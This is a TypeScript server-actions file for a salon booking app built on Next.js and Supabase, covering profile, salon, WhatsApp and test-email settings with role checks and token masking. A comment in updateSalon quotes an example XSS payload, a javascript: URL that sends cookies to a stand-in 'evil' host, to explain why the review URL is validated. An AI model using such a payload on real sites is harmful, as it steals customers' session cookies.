"use server";

import { revalidatePath } from "next/cache";
import { createClient } from "@/lib/supabase/server";
import { getCurrentProfile } from "@/lib/auth-server";
import { validateWebUrl } from "@/lib/url-validation";

export async function getProfile() {
  const supabase = await createClient();
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) return null;

  const { data } = await supabase
    .from("profiles")
    .select("id, full_name, email, phone, job_title, role")
    .eq("id", user.id)
    .single();

  return { ...data, email: user.email };
}

export async function updateProfile(fullName: string, phone: string, jobTitle: string) {
  const supabase = await createClient();
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) return { error: "Not authenticated" };

  // Look up the caller's role so we can decide which fields they may change.
  const { data: caller } = await supabase
    .from("profiles")
    .select("role")
    .eq("id", user.id)
    .single();

  // Staff can only edit their full name. Phone + job title are managed by
  // their owner via the team page. Server-side enforcement matches the UI.
  const update: Record<string, string | null> =
    caller?.role === "staff"
      ? { full_name: fullName }
      : {
          full_name: fullName,
          phone: phone || null,
          job_title: jobTitle || null,
        };

  const { error } = await supabase
    .from("profiles")
    .update(update)
    .eq("id", user.id);

  if (error) return { error: error.message };
  return { success: true };
}

export async function updatePassword(newPassword: string) {
  const supabase = await createClient();
  const { error } = await supabase.auth.updateUser({ password: newPassword });
  if (error) return { error: error.message };
  return { success: true };
}

export async function getBusinessSettings() {
  const supabase = await createClient();
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) return null;

  // Check if user is owner
  const { data: profile } = await supabase
    .from("profiles")
    .select("role")
    .eq("id", user.id)
    .single();

  if (profile?.role !== "owner") return null;

  const { data } = await supabase
    .from("business_settings")
    .select("*")
    .limit(1)
    .single();

  return data;
}

// ---- SALON SETTINGS (owner-only writes) ----

/**
 * Fetch the current user's salon. Any authenticated salon member can
 * read; the form below only renders for owners (RLS would also block
 * non-owner writes, but we gate in the action for clear errors).
 */
export async function getSalon() {
  const profile = await getCurrentProfile();
  if (!profile) return null;

  const supabase = await createClient();
  const { data, error } = await supabase
    .from("salons")
    .select(
      "id, name, slug, brand_color, contact_phone, public_review_url, signoff, default_language, currency, vat_percent, vat_trn, is_onboarded"
    )
    .eq("id", profile.salon_id)
    .single();

  if (error) return null;
  return data;
}

/**
 * Update salon-level branding/contact fields. Only the owner of the
 * salon can call this — RLS enforces it too, but we short-circuit here
 * with a friendly error.
 */
export async function updateSalon(input: {
  name: string;
  brand_color: string | null;
  contact_phone: string | null;
  public_review_url: string | null;
  signoff: string | null;
  default_language: string;
  currency: string;
  vat_percent: number;
  vat_trn: string | null;
}) {
  const profile = await getCurrentProfile();
  if (!profile) return { error: "Not authenticated" };
  if (profile.role !== "owner") {
    return { error: "Only the salon owner can edit salon settings" };
  }

  const name = input.name.trim();
  if (!name) return { error: "Salon name is required" };
  if (name.length > 80) return { error: "Salon name is too long (max 80)" };

  // Validate currency against the supported list (migration 030).
  const { isSupportedCurrency } = await import("@/lib/currency");
  const currency = (input.currency || "AED").trim();
  if (!isSupportedCurrency(currency)) {
    return { error: "Unsupported currency" };
  }

  // VAT validation — bounds match the DB check constraint.
  const vatPercent = Number(input.vat_percent);
  if (!Number.isFinite(vatPercent) || vatPercent < 0 || vatPercent > 100) {
    return { error: "VAT must be between 0 and 100" };
  }
  // If VAT is charged, TRN is legally required (UAE).
  const trnTrimmed = (input.vat_trn || "").trim();
  if (vatPercent > 0 && !trnTrimmed) {
    return { error: "TRN is required when VAT is charged" };
  }

  // public_review_url is rendered as window.location.href on the public
  // /r/[token] page. Without a protocol check, an owner (or attacker
  // with owner creds) could store javascript:fetch('evil/?'+cookie) and
  // execute JS in every reviewing customer's browser.
  const reviewUrlResult = validateWebUrl(input.public_review_url, "Review URL");
  if ("error" in reviewUrlResult) return { error: reviewUrlResult.error };
  const reviewUrl = reviewUrlResult.value;

  const supabase = await createClient();
  const { error } = await supabase
    .from("salons")
    .update({
      name,
      brand_color: input.brand_color || null,
      contact_phone: input.contact_phone || null,
      public_review_url: reviewUrl,
      signoff: input.signoff || null,
      default_language: input.default_language || "en",
      currency,
      vat_percent: vatPercent,
      vat_trn: trnTrimmed || null,
      updated_at: new Date().toISOString(),
    })
    .eq("id", profile.salon_id);

  if (error) return { error: error.message };

  // The salon name shows up in headers/templates across the app, so
  // bust the layout cache.
  revalidatePath("/", "layout");
  return { success: true };
}

export async function getTeamMembers() {
  const supabase = await createClient();
  const { data, error } = await supabase
    .from("profiles")
    .select("id, full_name, email, phone, job_title, role")
    .order("full_name");

  if (error) throw error;
  return data;
}

// ---- WHATSAPP CLOUD API SETTINGS (owner-only) ----

/**
 * Fetch WABA credential status for the owner-only Settings → WhatsApp
 * panel. We deliberately return only **partial** values so the access
 * token never round-trips to the browser:
 *
 *   - `phone_number_id` and `business_account_id` are returned in full
 *     (they're not secrets — they're references to Meta resources).
 *   - `access_token` is returned as `accessTokenMask` (last 4 chars
 *     prefixed with `…`) plus `hasAccessToken`. The form shows this so
 *     the owner can confirm a token is present without exposing it.
 */
export async function getWhatsAppSettings() {
  const profile = await getCurrentProfile();
  if (!profile) return null;
  if (profile.role !== "owner") return null;

  const supabase = await createClient();
  const { data, error } = await supabase
    .from("salons")
    .select(
      "whatsapp_phone_number_id, whatsapp_business_account_id, whatsapp_access_token"
    )
    .eq("id", profile.salon_id)
    .single();

  if (error || !data) return null;

  const token = data.whatsapp_access_token;
  return {
    phone_number_id: data.whatsapp_phone_number_id,
    business_account_id: data.whatsapp_business_account_id,
    hasAccessToken: !!token,
    accessTokenMask: token
      ? `…${token.slice(-4)}`
      : null,
  };
}

/**
 * Save WABA credentials. The access token is optional on update — pass
 * an empty string to *keep* the existing token (so the masked form
 * doesn't accidentally clear it on save). Pass a new value to replace.
 */
export async function updateWhatsAppSettings(input: {
  phone_number_id: string;
  business_account_id: string;
  /** "" = keep existing, anything else = replace. */
  access_token: string;
}) {
  const profile = await getCurrentProfile();
  if (!profile) return { error: "Not authenticated" };
  if (profile.role !== "owner") {
    return { error: "Only the salon owner can edit WhatsApp settings" };
  }

  const supabase = await createClient();
  const update: Record<string, string | null> = {
    whatsapp_phone_number_id: input.phone_number_id.trim() || null,
    whatsapp_business_account_id: input.business_account_id.trim() || null,
  };
  if (input.access_token.trim()) {
    update.whatsapp_access_token = input.access_token.trim();
  }

  const { error } = await supabase
    .from("salons")
    .update(update)
    .eq("id", profile.salon_id);

  if (error) return { error: error.message };
  revalidatePath("/settings");
  return { success: true };
}

/**
 * Recent WhatsApp send log rows for the owner-only audit view. Capped
 * at 50 (the table is intended for spot-checking, not deep history —
 * that's what an export would be for).
 */
export async function getWhatsAppLogs() {
  const profile = await getCurrentProfile();
  if (!profile) return [];
  if (profile.role !== "owner" && profile.role !== "admin") return [];

  const supabase = await createClient();
  const { data, error } = await supabase
    .from("whatsapp_send_log")
    .select("*")
    .order("created_at", { ascending: false })
    .limit(50);

  if (error) return [];
  return data;
}

/**
 * Send a quick "test" template message so the owner can verify their
 * credentials work without booking a real appointment. Uses the
 * `appointment_confirmation` template with placeholder values.
 */
export async function sendWhatsAppTestMessage(toPhone: string) {
  const profile = await getCurrentProfile();
  if (!profile) return { error: "Not authenticated" };
  if (profile.role !== "owner") {
    return { error: "Only the salon owner can send a test message" };
  }
  if (!toPhone || toPhone.replace(/\D/g, "").length < 7) {
    return { error: "Enter a valid phone number" };
  }

  const supabase = await createClient();
  const { data: salon } = await supabase
    .from("salons")
    .select("name, contact_phone")
    .eq("id", profile.salon_id)
    .single();

  // Build a sample appointment_confirmation send with today's date and
  // a generic service. Used only to verify credentials end-to-end.
  const today = new Date().toISOString().slice(0, 10);
  const { sendAppointmentConfirmation } = await import(
    "@/lib/whatsapp/templates"
  );
  const result = await sendAppointmentConfirmation({
    salonId: profile.salon_id,
    toPhone,
    salonName: salon?.name ?? "Sukona",
    salonPhone: salon?.contact_phone ?? "",
    customerName: "there",
    date: today,
    time: "10:00",
    services: [{ name: "Test service" }],
  });

  if (!result.ok) {
    if (result.error === "NOT_CONFIGURED") {
      return {
        error:
          "WhatsApp credentials are missing. Save phone number ID + access token first.",
      };
    }
    return { error: result.errorMessage ?? "Test send failed" };
  }
  revalidatePath("/settings");
  return { success: true };
}

// ============================================================
// Resend (transactional email) — config status + test sends
// ============================================================
//
// `sendTestEmail` is intentionally NOT a wrapper around
// dispatchWelcomeEmail / dispatchTrialReminder. Those write to
// email_send_log + short-circuit on a duplicate "sent" row, which is
// what we want for production (no double-sends to real customers)
// but the opposite of what you want when testing (you need to be able
// to fire the same template multiple times).
//
// So: render the same templates, send through Resend directly, prefix
// the subject with "[TEST]" so it's unmistakable in the inbox, and
// SKIP the audit log entirely. The production audit log stays clean.

export async function getEmailConfigStatus() {
  // No DB access — just a server-only read of env vars. Tells the UI
  // which "Send test" buttons to enable and explains in plain English
  // what's missing if anything is.
  const profile = await getCurrentProfile();
  if (!profile) return { error: "Not authenticated" } as const;
  if (profile.role !== "owner") return { error: "Not authorized" } as const;

  const hasApiKey = !!process.env.RESEND_API_KEY;
  const hasFrom = !!process.env.EMAIL_FROM;
  const fromAddress = process.env.EMAIL_FROM ?? null;

  return {
    configured: hasApiKey && hasFrom,
    hasApiKey,
    hasFrom,
    fromAddress,
  } as const;
}

export async function sendTestEmail(
  type: "welcome" | "trial_3d" | "trial_1d" | "trial_ended",
) {
  const profile = await getCurrentProfile();
  if (!profile) return { error: "Not authenticated" };
  if (profile.role !== "owner") {
    return { error: "Only the salon owner can send test emails" };
  }

  const apiKey = process.env.RESEND_API_KEY;
  const from = process.env.EMAIL_FROM;
  if (!apiKey || !from) {
    return {
      error:
        "Email isn't configured. Set RESEND_API_KEY and EMAIL_FROM in your Vercel env vars and redeploy.",
    };
  }

  // Pull the owner's email + salon name so the test renders with
  // real values (otherwise we're testing template logic, not what
  // the customer would actually receive).
  const supabase = await createClient();
  const { data: ownerRow } = await supabase
    .from("profiles")
    .select("email, full_name")
    .eq("id", profile.id)
    .single();
  const ownerEmail = ownerRow?.email;
  const ownerName = ownerRow?.full_name || "there";
  if (!ownerEmail) {
    return { error: "Your profile has no email address on file." };
  }

  const { data: salonRow } = await supabase
    .from("salons")
    .select("name, trial_ends_at")
    .eq("id", profile.salon_id)
    .single();
  const salonName = salonRow?.name || "your business";
  // For trial-reminder previews, fall back to "7 days from now" if
  // the salon doesn't have a trial_ends_at (e.g. exempt accounts) so
  // the date label in the email body still renders.
  const trialEndsAt = salonRow?.trial_ends_at
    ? new Date(salonRow.trial_ends_at)
    : new Date(Date.now() + 7 * 24 * 60 * 60 * 1000);

  const appUrl =
    process.env.NEXT_PUBLIC_APP_URL ||
    (process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : null) ||
    "http://localhost:3000";

  // Dynamic import keeps the template + Resend modules out of the
  // common server bundle. They only load when an owner clicks a test
  // button, which is rare.
  const { renderWelcome, renderTrialReminder, renderTrialEnded } =
    await import("@/lib/email/templates");
  const { Resend } = await import("resend");

  let tpl;
  if (type === "welcome") {
    tpl = renderWelcome({ ownerName, salonName, appUrl });
  } else if (type === "trial_ended") {
    tpl = renderTrialEnded({ ownerName, salonName, appUrl });
  } else {
    tpl = renderTrialReminder({
      ownerName,
      salonName,
      daysLeft: type === "trial_3d" ? 3 : 1,
      trialEndsAt,
      appUrl,
    });
  }

  const resend = new Resend(apiKey);
  try {
    const res = await resend.emails.send({
      from,
      to: ownerEmail,
      // [TEST] prefix makes these unmistakable in the inbox and in
      // Resend's dashboard — owner can filter them out from real sends.
      subject: `[TEST] ${tpl.subject}`,
      html: tpl.html,
      text: tpl.text,
    });
    if (res.error) {
      return { error: res.error.message ?? "Resend rejected the send" };
    }
    return {
      success: true,
      recipientEmail: ownerEmail,
      resend_message_id: res.data?.id ?? null,
    };
  } catch (err) {
    return {
      error: `Network error talking to Resend: ${
        err instanceof Error ? err.message : String(err)
      }`,
    };
  }
}
